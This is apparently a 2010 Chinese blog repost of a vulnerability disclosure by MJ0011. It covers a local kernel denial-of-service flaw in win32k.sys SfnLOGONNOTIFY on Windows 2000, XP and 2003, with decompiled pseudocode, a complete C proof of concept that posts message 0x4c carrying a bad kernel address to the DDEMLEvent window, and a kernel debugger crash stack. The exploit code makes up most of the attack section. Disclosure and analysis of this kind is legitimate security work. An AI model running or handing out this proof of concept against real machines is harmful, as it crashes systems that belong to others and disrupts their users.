---
title: Windows 2000/XP/2003 win32k.sys SfnLOGONNOTIFY 本地内核拒绝服务漏洞
description: post/Windows-2000-XP-2003-win32k.sys-SfnLOGONNOTIFY-local-DOS.html">Windows2000/XP/2003win32k.sysSfnLOGONNOTIFY本地内核拒绝服务漏洞影响范围:post/Deepin-LiteXP-Windows-XP-SP3-V6.2.html">MicrosoftWindowsXP/2000/2003全补丁漏洞细节：Win32k.sys在DispatchMessage时，会最后调用到xxxDefWindowProc,这个函数在处理某些消息时，会调用gapfnScSendMessage这个函数表中的函数来处理，其中2000/post/Deepin-GHOST-XP-SP3-V9.0-ISO.html">xp/2003下在处理0x4c号消息时，会有一个名为post/Windows-2000-XP-2003-win32k.sys-SfnLOGONNOTIFY-local-DOS.html">SfnLOGONNOTIFY的函数，这个函数再当wParam==4/13/12时，直接从lParam里取出数据，尽管函数内使用了SEH，但是只要传递错误的内核地址，仍然会引发系统崩溃。……
date: 2010-04-27 11:01:03
category: 漏洞信息
tags: ['漏洞信息', '内核', 'Windows']
post_id: 1124
alias: Windows-2000-XP-2003-win32k.sys-SfnLOGONNOTIFY-local-DOS
ViewNums: 2772
---

[Windows 2000/XP/2003 win32k.sys SfnLOGONNOTIFY 本地内核拒绝服务漏洞](/blog/windows-2000-xp-2003-win32ksys-sfnlogonnotify-local-dos)
影响范围:[Microsoft Windows XP](/blog/deepin-litexp-windows-xp-sp3-v62)/2000/2003 全补丁

漏洞细节：

Win32k.sys 在DispatchMessage时，会最后调用到xxxDefWindowProc,这个函数在处理某些消息时，会调用gapfnScSendMessage这个函数表中的函数来处理，其中2000/[xp](/blog/deepin-ghost-xp-sp3-v90-iso)/2003下在处理0x4c号消息时，会有一个名为[SfnLOGONNOTIFY](/blog/windows-2000-xp-2003-win32ksys-sfnlogonnotify-local-dos) 的函数，这个函数再当wParam == 4/13/12时，直接从lParam里取出数据，尽管函数内使用了SEH，但是只要传递错误的内核地址，仍然会引发系统崩溃。

伪代码：

if ( wParam == 4 || wParam == 13 || wParam == 12 )
{
    v18 = *(_DWORD *)lParam;
    v19 = *(_DWORD *)(lParam + 4);
    v20 = *(_DWORD *)(lParam + 8);
    v21 = *(_DWORD *)(lParam + 12);

测试代码：

#include "stdafx.h"
#include "windows.h"
int main(int argc, char* argv[])
{

printf("Microsoft Windows Win32k.sys SfnLOGONNOTIFY Local D.O.S Vuln
By MJ0011
th_decoder@126.com
PressEnter");

getchar();
HWND hwnd = FindWindow("DDEMLEvent" , NULL);

if (hwnd == 0 )
{
   printf("cannot find DDEMLEvent Window!
");
   return 0 ;
}

PostMessage(hwnd , 0x4c , 0x4 , 0x80000000);

return 0 ;
}

全补丁的XP运行此代码立即蓝屏

常见崩溃栈：

kd> kc

win32k!SfnLOGONNOTIFY
win32k!xxxDefWindowProc
win32k!xxxEventWndProc
win32k!xxxDispatchMessage
win32k!NtUserDispatchMessage
....

[Windows 7](/blog/windows-7-rtm-build-760016385)/Vista 无此问题

via [mj0011](http://hi.baidu.com/mj0011)

